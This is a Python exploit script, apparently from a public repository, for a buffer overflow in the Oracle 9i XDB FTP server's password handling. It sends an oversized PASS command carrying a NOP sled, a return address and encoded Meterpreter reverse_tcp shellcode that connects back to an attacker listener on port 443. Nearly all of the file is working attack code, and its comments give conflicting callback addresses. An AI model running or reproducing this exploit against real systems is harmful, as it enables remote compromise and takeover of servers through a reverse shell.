#!/usr/bin/python
## oracle_xdb_ftp_pass-exploit.py
##
## Exploits Oracle 9i XDB ftp password buffer overflow vulnerability
##
## Spawns a reverse meterpreter shell to 10.11.0.55:443
##
## Author Muhammad <ghmh [at] outlook.com
## https://github.com/Muhammd/oracle_xdb
##
## TODO: adjust 
##		- rhost to point to the right target
##		- rport to use the right port
##
## Execution: python oracle_xdb_ftp_pass-exploit.py

import sys, socket, random, string


rhost = "10.11.1.202" 		# Target IP address
rport = 2100			# Target Port, can be 135, 137, 445


## Return addresses according to metasploit:
##
##   0x60616d46		oraclient9.dll (pop/pop/ret)



ret = "\x46\x6d\x61\x60"			## Return address (Little Endian)



nops = "\x90" *(800-308-7)			## to fill 800

prependencoder = "\x81\xc4\xff\xef\xff\xff\x44"	## following the NOP sled, but before the decoder machine code


## Max space for shell code = 800
## Bad characters according to metasploit: \x00\x09\x0a\x0d\x20\x22\x25\x26\x27\x2b\x2f\x3a\x3c\x3e\x3f\x40
## Shellcode via: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.192.14 LPORT=443 EXITFUNC=thread -a x86 --platform Windows  -b \x00\x09\x0a\x0d\x20\x22\x25\x26\x27\x2b\x2f\x3a\x3c\x3e\x3f\x40 -f python -v shellcode
## x86/call4_dword_xor succeeded with size 308 (iteration=0)


shellcode =  ""
shellcode += nops
shellcode += prependencoder
shellcode += "\x31\xc9\x83\xe9\xb9\xe8\xff\xff\xff\xff\xc0\x5e"
shellcode += "\x81\x76\x0e\x94\x9e\x91\xbd\x83\xee\xfc\xe2\xf4"
shellcode += "\x68\x76\x13\xbd\x94\x9e\xf1\x34\x71\xaf\x51\xd9"
shellcode += "\x1f\xce\xa1\x36\xc6\x92\x1a\xef\x80\x15\xe3\x95"
shellcode += "\x9b\x29\xdb\x9b\xa5\x61\x3d\x81\xf5\xe2\x93\x91"
shellcode += "\xb4\x5f\x5e\xb0\x95\x59\x73\x4f\xc6\xc9\x1a\xef"
shellcode += "\x84\x15\xdb\x81\x1f\xd2\x80\xc5\x77\xd6\x90\x6c"
shellcode += "\xc5\x15\xc8\x9d\x95\x4d\x1a\xf4\x8c\x7d\xab\xf4"
shellcode += "\x1f\xaa\x1a\xbc\x42\xaf\x6e\x11\x55\x51\x9c\xbc"
shellcode += "\x53\xa6\x71\xc8\x62\x9d\xec\x45\xaf\xe3\xb5\xc8"
shellcode += "\x70\xc6\x1a\xe5\xb0\x9f\x42\xdb\x1f\x92\xda\x36"
shellcode += "\xcc\x82\x90\x6e\x1f\x9a\x1a\xbc\x44\x17\xd5\x99"
shellcode += "\xb0\xc5\xca\xdc\xcd\xc4\xc0\x42\x74\xc1\xce\xe7"
shellcode += "\x1f\x8c\x7a\x30\xc9\xf6\xa2\x8f\x94\x9e\xf9\xca"
shellcode += "\xe7\xac\xce\xe9\xfc\xd2\xe6\x9b\x93\x61\x44\x05"
shellcode += "\x04\x9f\x91\xbd\xbd\x5a\xc5\xed\xfc\xb7\x11\xd6"
shellcode += "\x94\x61\x44\xd7\x91\xf6\x9b\xb6\x94\xa9\xf9\xbf"
shellcode += "\x94\x9f\x2a\x34\x72\xce\xc1\xed\xc4\xde\xc1\xfd"
shellcode += "\xc4\xf6\x7b\xb2\x4b\x7e\x6e\x68\x03\xf4\x81\xeb"
shellcode += "\xc3\xf6\x08\x18\xe0\xff\x6e\x68\x11\x5e\xe5\xb1"
shellcode += "\x6b\xd0\x99\xc8\x78\xf6\x61\x08\x36\xc8\x6e\x68"
shellcode += "\xfe\x9e\xfb\xb9\xc2\xc9\xf9\xbf\x4d\x56\xce\x42"
shellcode += "\x41\x15\xa7\xd7\xd4\xf6\x91\xad\x94\x9e\xc7\xd7"
shellcode += "\x94\xf6\xc9\x19\xc7\x7b\x6e\x68\x07\xcd\xfb\xbd"
shellcode += "\xc2\xcd\xc6\xd5\x96\x47\x59\xe2\x6b\x4b\x90\x7e"
shellcode += "\xbd\x58\xe4\x53\x57\x9e\x91\xbd"



user = "".join( [random.choice(string.uppercase) for i in xrange(10)] )				## 10 random uppercase characters

passwd = "".join( [random.choice(string.uppercase) for i in xrange(442)] )			## 442 random uppercase characters
jmp_short = "\xEB\x06"										## Short jump (\xEB) to an offset of 6 (\x06) according to metasploit (Rex::Arch::X86.jmp_short(6))		
two_nops  = "\x90\x90"										## Two NOP's


## Let's build the exploit that is send as password

buffer = passwd + jmp_short + two_nops + ret + shellcode


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	print "\nConnecting..."
	s.connect((rhost,rport))
	data = s.recv(1024)
	s.send('USER' + user +'\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print "\nDone! Check your Multi Hander"
	s.close
except:
	print "Could not connect to " + rhost + ":" + str(rport) + "!"
